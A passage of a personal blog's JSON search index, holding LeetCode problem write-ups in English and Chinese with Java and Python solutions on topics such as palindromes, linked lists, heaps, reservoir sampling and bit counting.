s.toString();&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"},{"name":"Math","slug":"Math","permalink":"http://larryim.cc/tags/Math/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"409. Longest Palindrome","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-409-Longest-Palindrome/","text":"Given a string which consists of lowercase or uppercase letters, find the length of the longest palindromes that can be built with those letters. This is case sensitive, for example &quot;Aa&quot; is not considered a palindrome here. Note:Assume the length of given string will not exceed 1,010. Example: 12345678Input:&quot;abccccdd&quot;Output:7Explanation:One longest palindrome that can be built is &quot;dccaccd&quot;, whose length is 7. Java最长回文。使用哈希表存储，这里由于存储对象是字母，所以可以用长128的数组存储(ascii表长度为128)。 12345678910111213141516public int longestPalindrome(String s) &#123; if (s == null || s.length() == 0) return 0; int [] count = new int[128]; int res = 0; for (char c: s.toCharArray()) count[c]++; for (int i = 0; i &lt; 128; i++) res += count[i]/2; res *= 2; if (res &lt; s.length()) res++; return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"4. Median of Two Sorted Arrays","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-4-Median-of-Two-Sorted-Arrays/","text":"There are two sorted arrays nums1 and nums2 of size $m$ and $n$ respectively. Find the median of the two sorted arrays. The overall run time complexity should be $O(\\log (m+n))$. You may assume nums1 and nums2 cannot be both empty. Example 1: 123nums1 = [1, 3]nums2 = [2]The median is 2.0 Example 2: 123nums1 = [1, 2]nums2 = [3, 4]The median is (2 + 3)/2 = 2.5 Java","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"},{"name":"Divide and Conquer","slug":"Divide-and-Conquer","permalink":"http://larryim.cc/tags/Divide-and-Conquer/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"876. Middle of the Linked List","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-876-Middle-of-the-Linked-List/","text":"Given a non-empty, singly linked list with head node head, return a middle node of linked list. If there are two middle nodes, return the second middle node. Example 1: 12345Input: [1,2,3,4,5]Output: Node 3 from this list (Serialization: [3,4,5])The returned node has value 3. (The judge&apos;s serialization of this node is [3,4,5]).Note that we returned a ListNode object ans, such that:ans.val = 3, ans.next.val = 4, ans.next.next.val = 5, and ans.next.next.next = NULL. Example 2: 123Input: [1,2,3,4,5,6]Output: Node 4 from this list (Serialization: [4,5,6])Since the list has two middle nodes with values 3 and 4, we return the second one. Note: The number of nodes in the given list will be between 1 and 100. Java使用快指针和慢指针。一开始，它们都指向链表头部，快指针每次移动两步，慢指针每次移动一步。当快指针不能再移动时，也就是到达链表尾部时，慢指针的位置就是链表的中间位置。 12345678public ListNode middleNode(ListNode head) &#123; ListNode fast = head, slow = head; while (fast != null &amp;&amp; fast.next != null) &#123; fast = fast.next.next; slow = slow.next; &#125; return slow;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Linked List","slug":"Linked-List","permalink":"http://larryim.cc/tags/Linked-List/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"382. Linked List Random Node","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-382-Linked-List-Random-Node/","text":"Given a singly linked list, return a random node’s value from the linked list. Each node must have the same probability of being chosen. Follow up:What if the linked list is extremely large and its length is unknown to you? Could you solve this efficiently without using extra space? Example: 123456789// Init a singly linked list [1,2,3].ListNode head = new ListNode(1);head.next = new ListNode(2);head.next.next = new ListNode(3);Solution solution = new Solution(head);// getRandom() should return either 1, 2, or 3 randomly. // Each element should have equal probability of returning.solution.getRandom(); Java这道题目比较直接，也是最平常的想法，就是每次调用getRandom()产生一个随机数，随机数的范围在[0, len]之间，其中len是链表的长度。这样就保证了产生的随机数是随机的。 123456789101112131415161718192021private ListNode head;private Random random;private int len;/** @param head The linked list's head. Note that the head is guaranteed to be not null, so it contains at least one node. */public Solution(ListNode head) &#123; this.head = head; random = new Random(); for (len = 0; head != null; len++) head = head.next;&#125; /** Returns a random node's value. */public int getRandom() &#123; int index = random.nextInt(len); ListNode cur = this.head; for (int i = 0; i &lt; index; i++) cur = cur.next; return cur.val;&#125; 但题目里又说了，如果数据量非常大怎么办？上面的解法中有个缺陷，那就是调用一次getRandom()要遍历两遍链表，这在数据量大的时候非常不适合。那么有没有可能只要遍历一次链表就能得到一个随机的链表节点值呢？当然有，水塘抽样算法！ 水塘抽样算法，其目的在于从包含$n$个项目的集合S中选取$k$个样本，其中$n$为一很大或未知的数量，尤其适用于不能把所有$n$个项目都存放到主内存的情况。这里是水塘抽样算法的特例，$k=1$。其基本思路如下： 初始化结果为head：result = head.val 初始化 $i = 2$ 现在从第二个节点向前依次考虑每个节点 产生0到$i-1$的随机数$j$ 如果$j$等于0(或者其他固定的从0到$n-1$的数，将结果取代为现在节点的值 $i = i + 1$ current = current-&gt;next 具体Java代码如下： 1234567891011121314151617181920private ListNode head;private Random random;/** @param head The linked list's head. Note that the head is guaranteed to be not null, so it contains at least one node. */public Solution(ListNode head) &#123; this.head = head; random = new Random(); &#125;/** Returns a random node's value. */public int getRandom() &#123; ListNode head = this.head; int res = head.val; for (int i = 2; head.next != null; i++) &#123; head = head.next; if(random.nextInt(i) == 0) res = head.val; &#125; return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Reservoir Sampling","slug":"Reservoir-Sampling","permalink":"http://larryim.cc/tags/Reservoir-Sampling/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"867. Transpose Matrix","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-867-Transpose-Matrix/","text":"Given a matrix A, return the transpose of A. The transpose of a matrix is the matrix flipped over it’s main diagonal, switching the row and column indices of the matrix. Example 1: 12Input: [[1,2,3],[4,5,6],[7,8,9]]Output: [[1,4,7],[2,5,8],[3,6,9]] Example 2: 12Input: [[1,2,3],[4,5,6]]Output: [[1,4],[2,5],[3,6]] Note: 1 &lt;= A.length &lt;= 1000 1 &lt;= A[0].length &lt;= 1000 Java123456789public int[][] transpose(int[][] A) &#123; int m = A.length, n = A[0].length; int[][] newA = new int[n][m]; for (int i = 0; i &lt; m; i++) for (int j = 0; j &lt; n; j++) newA[j][i] = A[i][j]; return newA; &#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"88. Merge Sorted Array","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-88-Merge-Sorted-Array/","text":"Given two sorted integer arrays nums1 and nums2, merge nums2 into nums1 as one sorted array. Note: The number of elements initialized in nums1 and nums2 are m and n respectively. You may assume that nums1 has enough space (size that is greater or equal to m + n) to hold additional elements from nums2. Example: 12345Input:nums1 = [1,2,3,0,0,0], m = 3nums2 = [2,5,6], n = 3Output: [1,2,2,3,5,6] Java采用两个指针l1,l2分别指向nums1,nums2的尾部，依次把比较大的元素加入到nums1的后部。 12345678910public void merge(int[] nums1, int m, int[] nums2, int n) &#123; int l1 = m - 1, l2 = n - 1, k = l1 + l2 + 1; while (l1 &gt;= 0 || l2 &gt;= 0) &#123; if (l1 &gt;= 0 &amp;&amp; l2 &gt;=0) &#123; if (nums1[l1] &gt; nums2[l2]) nums1[k--] = nums1[l1--]; else nums1[k--] = nums2[l2--]; &#125; else if (l2 &gt;= 0) nums1[k--] = nums2[l2--]; else break; // do nothing; &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Array","slug":"Array","permalink":"http://larryim.cc/tags/Array/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"378. Kth Smallest Element in a Sorted Matrix","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-378-Kth-Smallest-Element-in-a-Sorted-Matrix/","text":"Given a $n \\times n$ matrix where each of the rows and columns are sorted in ascending order, find the $k$th smallest element in the matrix. Note that it is the kth smallest element in the sorted order, not the kth distinct element. Example: 12345678matrix = [ [ 1, 5, 9], [10, 11, 13], [12, 13, 15]],k = 8,return 13. Note: You may assume $k$ is always valid, $1 \\le k \\le n^2$. Java使用最小二叉堆，把元素放入堆中，然后依次取出$k$次，第$k$次取出的元素即为第$k$个最小元素。问题是怎么放元素，才能使时间和空间复杂度达到最优。最直接的方法是把所有元素放入最大二叉堆中，最大二叉堆的大小为k，当二叉堆放不下时，取出堆顶元素，当循环结束时，最大二叉堆的堆顶元素恰好是第$k$个最小元素。但这种方法的时间复杂度达到$O(n\\log n)$，很明显是不行的：如果把所有元素排序，然后取出第$k$个最小元素，时间复杂度相同。 上面的方法根本没有利用题目的性质：排序的矩阵。也就是说对于矩阵元素$(i, j)$，元素$(i+1, j)$和元素$(i, j+1)$都大于$(i, j)$。利用这样的性质，可以设想，把第一行元素都放入最小二叉堆中，然后每次取出一个元素$(i, j)$，将大于该元素的元素$(i+1, j)$放入到二叉堆中，依次循环$k$次，第$k$次取出的元素即为第$k$个最小元素。 12345678910111213141516171819202122232425262728public int kthSmallest(int[][] matrix, int k) &#123; PriorityQueue&lt;Tuple&gt; pq = new PriorityQueue&lt;&gt;(); int n = matrix.length; for (int i = 0; i &lt; n; i++) pq.offer(new Tuple(matrix[0][i], 0, i)); Tuple cur; for (int i = 1; i &lt; k; i++) &#123; cur = pq.poll(); if (cur.x + 1 &lt; n) pq.offer(new Tuple(matrix[cur.x + 1][cur.y], cur.x + 1, cur.y)); &#125; return pq.poll().val;&#125; class Tuple implements Comparable&lt;Tuple&gt; &#123; int x; int y; int val; public Tuple(int val, int x, int y) &#123; this.x = x; this.y = y; this.val = val; &#125; public int compareTo(Tuple another) &#123; return val - another.val; &#125; &#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"},{"name":"Heap","slug":"Heap","permalink":"http://larryim.cc/tags/Heap/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"9. Palindrome Number","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-9-Palindrome-Number/","text":"Determine whether an integer is a palindrome. Do this without extra space. click to show spoilers. Some hints:Could negative integers be palindromes? (ie, -1) If you are thinking of converting the integer to string, note the restriction of using extra space. You could also try reversing an integer. However, if you have solved the problem “Reverse Integer”, you know that the reversed integer might overflow. How would you handle such case? There is a more generic way of solving this problem. 1234567891011121314151617class Solution: def isPalindrome(self, x): if x &lt; 0: return False r = 1 while x / r &gt;= 10: r *= 10 while r &gt; 1: left, x =divmod(x, r) x, right = divmod(x, 10) if left != right: return False r //= 100 return True //符号： 1234567In Python 3// =&gt; used for integer output/ =&gt; used for double output100/35 =&gt; 2.857142857142857100//35 =&gt; 2100.//35 =&gt; 2.0 # floating-point result if divsor or dividend real","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"373. Find K Pairs with Smallest Sums","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-373-Find-K-Pairs-with-Smallest-Sums/","text":"You are given two integer arrays nums1 and nums2 sorted in ascending order and an integer k. Define a pair $(u,v)$ which consists of one element from the first array and one element from the second array. Find the $k$ pairs $(u_1,v_1),(u_2,v_2) …(u_k,v_k)$ with the smallest sums. Example 1: 1234Input: nums1 = [1,7,11], nums2 = [2,4,6], k = 3Output: [[1,2],[1,4],[1,6]] Explanation: The first 3 pairs are returned from the sequence: [1,2],[1,4],[1,6],[7,2],[7,4],[11,2],[7,6],[11,4],[11,6] Example 2: 1234Input: nums1 = [1,1,2], nums2 = [1,2,3], k = 2Output: [1,1],[1,1]Explanation: The first 2 pairs are returned from the sequence: [1,1],[1,1],[1,2],[2,1],[1,2],[2,2],[1,3],[1,3],[2,3] Example 3: 123Input: nums1 = [1,2], nums2 = [3], k = 3Output: [1,3],[2,3]Explanation: All possible pairs are returned from the sequence: [1,3],[2,3] Java寻找和最小的k对数字。最直接的方法是给出所有的对，一共有$n_1 \\times n_2$对数字，其中$n_1$和$n_2$分别为数组nums1和nums2的长度。然后将所有对排序，取出前$k$对数字。那么怎么排序呢？肯定是必须构造一个Comparator。 123456789101112131415161718192021public List&lt;int[]&gt; kSmallestPairs(int[] nums1, int[] nums2, int k) &#123; List&lt;int[]&gt; list = new ArrayList&lt;&gt;(); if (nums1 == null || nums2 == null) return list; int n1 = nums1.length, n2 = nums2.length; PriorityQueue&lt;int[]&gt; pq = new PriorityQueue&lt;&gt;(new PairComparator()); for (int i = 0; i &lt; n1; i++) for (int j = 0; j &lt; n2; j++) pq.offer(new int[]&#123;nums1[i], nums2[j]&#125;); int bound = Math.min(k, n1*n2); for (int i = 0; i &lt; bound; i++) list.add(pq.poll()); return list;&#125; class PairComparator implements Comparator&lt;int[]&gt; &#123; public int compare(int[] one, int[] two) &#123; return one[0] + one[1] - two[0] - two[1]; &#125;&#125; 一种更好的方法是使用二叉堆来保存最小对，但是只需要维护K个对即可。因为对于每一个在nums1中的元素来说，对于最小的对，总是从nums2中的第一个元素开始，因为nums2是排序的。所以下一个元素总是nums1[this specific number] + nums2[current_associated_index + 1]，除非越界。 12345678910111213141516171819public List&lt;int[]&gt; kSmallestPairs(int[] nums1, int[] nums2, int k) &#123; PriorityQueue&lt;int[]&gt; pq = new PriorityQueue&lt;&gt;((a,b) -&gt; a[0]+a[1]-b[0]-b[1]); List&lt;int[]&gt; list = new ArrayList&lt;&gt;(); if (nums1 == null || nums2 == null) return list; int n1 = nums1.length, n2 = nums2.length; if (n1 == 0 || n2 == 0 || k == 0) return list; for (int i = 0; i &lt; n1 &amp;&amp; i &lt; k; i++) // nums1中的值，nums2中的值， nums2的下标 pq.offer(new int[]&#123;nums1[i], nums2[0], 0&#125;); int[] cur; int bound = Math.min(n1*n2, k); while (k--&gt; 0 &amp;&amp; !pq.isEmpty())&#123; cur = pq.poll(); list.add(new int[]&#123;cur[0], cur[1]&#125;); if (cur[2] + 1 == n2) continue; pq.offer(new int[]&#123;cur[0], nums2[cur[2]+1], cur[2]+1&#125;); &#125; return list;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Heap","slug":"Heap","permalink":"http://larryim.cc/tags/Heap/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"359. Logger Rate Limiter","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-359-Logger-Rate-Limiter/","text":"","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"Design","slug":"Design","permalink":"http://larryim.cc/tags/Design/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"350. Intersection of Two Arrays II","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-350-Intersection-of-Two-Arrays-II/","text":"Given two arrays, write a function to compute their intersection. Example 1: 12Input: nums1 = [1,2,2,1], nums2 = [2,2]Output: [2,2] Example 2: 12Input: nums1 = [4,9,5], nums2 = [9,4,9,8,4]Output: [4,9] Note: Each element in the result should appear as many times as it shows in both arrays. The result can be in any order. Follow up: What if the given array is already sorted? How would you optimize your algorithm? What if nums1‘s size is small compared to nums2‘s size? Which algorithm is better? What if elements of nums2 are stored on disk, and the memory is limited such that you cannot load all elements into the memory at once? Java两个数组的交集。这道题目是LeetCode 349. Intersection of Two Arrays的延伸，前者返回的交集中每个元素出现一次，这里要求中每个元素出现的次数应与元素在两个数组中出现的次数一致。那么一种非常直接的方法就是把前者的Set该成HashMap来记录每个元素出现的次数。 1234567891011121314public int[] intersect(int[] nums1, int[] nums2) &#123; Map&lt;Integer, Integer&gt; map = new HashMap&lt;&gt;(); List&lt;Integer&gt; list = new ArrayList&lt;&gt;(); for (int num : nums1) map.put(num, map.getOrDefault(num, 0) + 1); for (int num : nums2) if (map.containsKey(num) &amp;&amp; map.get(num) &gt; 0) &#123; map.put(num, map.get(num) - 1); list.add(num); &#125; int[] res = new int[list.size()]; for (int i = 0; i &lt; list.size(); i++) res[i] = list.get(i); return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"349. Intersection of Two Arrays","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-349-Intersection-of-Two-Arrays/","text":"Given two arrays, write a function to compute their intersection. Example 1: 12Input: nums1 = [1,2,2,1], nums2 = [2,2]Output: [2] Example 2: 12Input: nums1 = [4,9,5], nums2 = [9,4,9,8,4]Output: [9,4] Note: 12Each element in the result must be unique.The result can be in any order. Java使用两个HashSet. 12345678910111213141516public int[] intersection(int[] nums1, int[] nums2) &#123; Set&lt;Integer&gt; set = new HashSet&lt;&gt;(), resSet = new HashSet&lt;&gt;(); for (int num : nums1) set.add(num); for (int num : nums2) if (set.contains(num)) resSet.add(num); int [] res = new int[resSet.size()]; int i = 0; for (Integer num : resSet) res[i++] = num; return res;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Sort","slug":"Sort","permalink":"http://larryim.cc/tags/Sort/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"Binary Search","slug":"Binary-Search","permalink":"http://larryim.cc/tags/Binary-Search/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"338. Counting Bits","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-338-Counting-Bits/","text":"Given a non negative integer number num. For every numbers $i$ in the range 0 ≤ i ≤ num calculate the number of 1’s in their binary representation and return them as an array. Example 1: 12Input: 2Output: [0,1,1] Example 2: 12Input: 5Output: [0,1,1,2,1,2] Follow up: It is very easy to come up with a solution with run time $O(n*\\text{sizeof(integer}))$. But can you do it in linear time $O(n)$ /possibly in a single pass? Space complexity should be $O(n)$. Can you do it like a boss? Do it without using any builtin function like __builtin_popcount in c++ or in any other language. Java首先肯定是最直接的方法：依次求出每个数的二进制表示中1的个数，时间复杂度是$O(n\\log n)$： 123456789101112131415 public int[] countBits(int num) &#123; int[] res = new int[num + 1]; for (int i = 1; i &lt; res.length; i++) res[i] = numbits(i); return res;&#125;private int numbits(int num) &#123; int count = 0; while (num &gt; 0) &#123; count += num &amp; 1; num &gt;&gt;&gt;= 1; &#125; return count;&#125; 但是题目又说了，有没有更优的算法的时间和空间复杂度只有线性$O(n)$？既然只有线性，肯定是只有遍历一遍了，而且肯定需要利用前面的结果，也就是说很有可能利用到动态规划。设想一下当前数字$i$的二进制表示中有$k$位数，那么最低$k-1$位数的增加过程其实已经出现在前面增加的过程中，只不过最高位–第$k$位多了一个1而已。为了尽一步验证，尝试把最直接方法得到的res打印出来 12345for (int i = 0; i &lt; res.length; i++) &#123; if (res[i] == 1) System.out.println(\"\\n\"); System.out.print(String.format(\"(%d)%2d, \", i, res[i]));&#125;System.out.println(\"\\n\"); 结果如下： 12345(0) 0, (1) 1, (2) 1, (3) 2, (4) 1, (5) 2, (6) 2, (7) 3, (8) 1, (9) 2, (10) 2, (11) 3, (12) 2, (13) 3, (14) 3, (15) 4, 证明猜想是对的。那么代码的思路非常明显了：第$k$排数字等于前面的所有数字加1! 12345678public int[] countBits(int num) &#123; int[] res = new int[num + 1]; for (int i = 1, row = 1, j = 0; i &lt; res.length; i++) &#123; if (i == row) &#123; row *= 2; j = 0; &#125; res[i] = res[j++] + 1; &#125; return res;&#125; 后来在论坛上发现同样简单的方法： 12f[n] = f[n去除最后一位数字] + 最后一位数字f[i] = f[i &gt;&gt; 1] + (i &amp; 1) 用代码表示为： 12345public int[] countBits(int num) &#123; int[] f = new int[num + 1]; for (int i=1; i&lt;=num; i++) f[i] = f[i &gt;&gt; 1] + (i &amp; 1); return f;&#125;","tags":[{"name":"Dynamic Programming","slug":"Dynamic-Programming","permalink":"http://larryim.cc/tags/Dynamic-Programming/"},{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Bit Manipulation","slug":"Bit-Manipulation","permalink":"http://larryim.cc/tags/Bit-Manipulation/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"3. Longest Substring Without Repeating Characters","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-3-Longest-Substring-Without-Repeating-Characters/","text":"Given a string, find the length of the longest substring without repeating characters. Example 1: 123Input: &quot;abcabcbb&quot;Output: 3 Explanation: The answer is &quot;abc&quot;, with the length of 3. Example 2: 123Input: &quot;bbbbb&quot;Output: 1Explanation: The answer is &quot;b&quot;, with the length of 1. Example 3: 1234Input: &quot;pwwkew&quot;Output: 3Explanation: The answer is &quot;wke&quot;, with the length of 3. Note that the answer must be a substring, &quot;pwke&quot; is a subsequence and not a substring. Java滑动窗口题，类似于LeetCode 76. Minimum Window Substring。 123456789101112131415161718192021222324252627282930313233343536public int lengthOfLongestSubstring(String s) &#123; if (s == null || s.length() == 0) return 0; int n = s.length(); // 哈希表 int[] map = new int[128]; // 左右指针 int l = 0, r = 0; // 最长子字符串 int maxLength = 0; // 左右字符 char cr, cl; while (r &lt; n) &#123; cr = s.charAt(r); map[cr]++; // 子字符串不重复，满足要求 if (map[cr] == 1) &#123; // 子字符串长度是否比目前发现的最长字符串还长？ if (r - l + 1 &gt; maxLength) maxLength = r - l + 1; &#125; else &#123; // 移动左指针，直到不重复 while (true) &#123; cl = s.charAt(l); map[cl]--; l++; if (cl == cr) break; &#125; &#125; r++; &#125; return maxLength;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"},{"name":"Two Pointers","slug":"Two-Pointers","permalink":"http://larryim.cc/tags/Two-Pointers/"},{"name":"String","slug":"String","permalink":"http://larryim.cc/tags/String/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"295. Find Median from Data Stream","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-295-Find-Median-from-Data-Stream/","text":"Median is the middle value in an ordered integer list. If the size of the list is even, there is no middle value. So the median is the mean of the two middle value. For example, 123[2,3,4], the median is 3[2,3], the median is (2 + 3) / 2 = 2.5 Design a data structure that supports the following two operations: void addNum(int num) - Add an integer number from the data stream to the data structure. double findMedian() - Return the median of all elements so far. Example: 12345addNum(1)addNum(2)findMedian() -&gt; 1.5addNum(3) findMedian() -&gt; 2 Follow up: If all integer numbers from the stream are between 0 and 100, how would you optimize it? If 99% of all integer numbers from the stream are between 0 and 100, how would you optimize it? Java分析详见斯坦福算法课程笔记。 12345678910111213141516171819202122232425262728293031class MedianFinder &#123; private PriorityQueue&lt;Integer&gt; minHeap; private PriorityQueue&lt;Integer&gt; maxHeap; /** initialize your data structure here. */ public MedianFinder() &#123; minHeap = new PriorityQueue&lt;&gt;(); maxHeap = new PriorityQueue&lt;&gt;(Collections.reverseOrder()); &#125; public void addNum(int num) &#123; if (maxHeap.peek() == null || maxHeap.peek() &gt; num) maxHeap.offer(num); else minHeap.add(num); if (maxHeap.size() + 1 &lt; minHeap.size()) maxHeap.offer(minHeap.poll()); else if (minHeap.size() + 1 &lt; maxHeap.size()) minHeap.offer(maxHeap.poll()); &#125; public double findMedian() &#123; if (maxHeap.size() == minHeap.size()) return (maxHeap.peek() + minHeap.peek()) / 2.0; if (maxHeap.size() &gt; minHeap.size()) return maxHeap.peek(); return minHeap.peek(); &#125;&#125;","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Design","slug":"Design","permalink":"http://larryim.cc/tags/Design/"},{"name":"Heap","slug":"Heap","permalink":"http://larryim.cc/tags/Heap/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"290. Word Pattern","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Leetcode-290-Word-Pattern/","text":"Given a pattern and a string str, find if str follows the same pattern. Here follow means a full match, such that there is a bijection between a letter in pattern and a non-empty word in str. Example 1: 12Input: pattern = &quot;abba&quot;, str = &quot;dog cat cat dog&quot;Output: true Example 2: 12Input:pattern = &quot;abba&quot;, str = &quot;dog cat cat fish&quot;Output: false Example 3: 12Input: pattern = &quot;aaaa&quot;, str = &quot;dog cat cat dog&quot;Output: false Example 4: 12Input: pattern = &quot;abba&quot;, str = &quot;dog dog dog dog&quot;Output: false Notes:You may assume pattern contains only lowercase letters, and str contains lowercase letters separated by a single space. Java这道题目是LeetCode 205. Isomorphic Strings的扩展。在Q205中，字符和字符存在一一对应关系。这里字符和字符串存在一一对应关系。但是它们的实质是相同的。在Q205中，有两种方法来解决问题；在这道题目中这两种方法仍旧适用，只需要稍微改编一下即可。 方法1， 使用哈希表来存储pattern和str的一一对应关系。 1234567891011121314151617public boolean wordPattern(String pattern, String str) &#123; String[] strs = str.trim().split(\"\\\\s+\"); if (pattern.length() != strs.length) return false; Map&lt;Character, String&gt; map = new HashMap&lt;&gt;(); Set&lt;String&gt; set = new HashSet&lt;&gt;(); for (int i = 0; i &lt; pattern.length(); i++) &#123; if (map.containsKey(pattern.charAt(i))) &#123; if (!map.get(pattern.charAt(i)).equals(strs[i])) return false; &#125; else &#123; if (!set.add(strs[i])) return false; map.put(pattern.charAt(i), strs[i]); &#125; &#125; return true; &#125; 方法2， 存储下标 12345678910public boolean wordPattern(String pattern, String str) &#123; String[] words = str.split(\" \"); if (words.length != pattern.length()) return false; Map index = new HashMap(); for (Integer i = 0; i&lt;words.length; ++i) if (index.put(pattern.charAt(i), i) != index.put(words[i], i)) return false; return true; &#125; 上面的代码中Map缺失了Generics, 但是可以把两种类型的数据(Character, String)都放进去。","tags":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/tags/Leetcode/"},{"name":"Hash Table","slug":"Hash-Table","permalink":"http://larryim.cc/tags/Hash-Table/"}],"categories":[{"name":"Leetcode","slug":"Leetcode","permalink":"http://larryim.cc/categories/Leetcode/"}]},{"title":"水塘抽样","date":"2017-10-09T16:00:00.000Z","path":"2017/10/10/Algorithm-水塘抽样/","text":"Reservoir sampling(水塘抽样) is a family of randomized algorithms for randomly choosing k samples from a list of n items, where n is either a very large or unknown number. Typically n is large enough that the list doesn’t fit into main memory. For example, a list of search queries in Google and Facebook. So we are given a big array (or stream) of numbers (to simplify), and we need to write an efficient function to randomly select k numbers where 1 &lt;= k &lt;= n. Let the input array be stream[]. A simple solution is to create an array reservoir[] of maximum size k. One by one randomly select an item from stream[0..n-1]. If the selected item is not previously selected, then put it in reservoir[]. To check if an item is previously selected or not, we need to search the item in reservoir[]. The time complexity of this algorithm will be $O(k^2)$. This can be costly if k is big. Also, this is not efficient if the input is in the form of a stream. Problem: Choose k entries from n numbers. Make sure each number is selected with the probability of k/n Basic idea: Choose 1, 2, 3, …, k first and put them into the reservoir. For k+1, pick it with a probability of k/(k+1), and randomly replace a number in the reservoir. For k+i, pick it with a probability of k/(k+i), and randomly replace a number in the reservoir. Repeat until k+i reaches n Proof: For k+i, the probability that it is selected and will replace a number in the reservoir is k/(k+i) For a number in the reservoir before (let’s say X), the probability that it keeps staying in the reservoir is P(X was in the reservoir last time) × P(X is not replaced by k+i) = P(X was in the reservoir last time) × (1 - P(k+i is selected and replaces X)) = k/(k+i-1) × （1 - 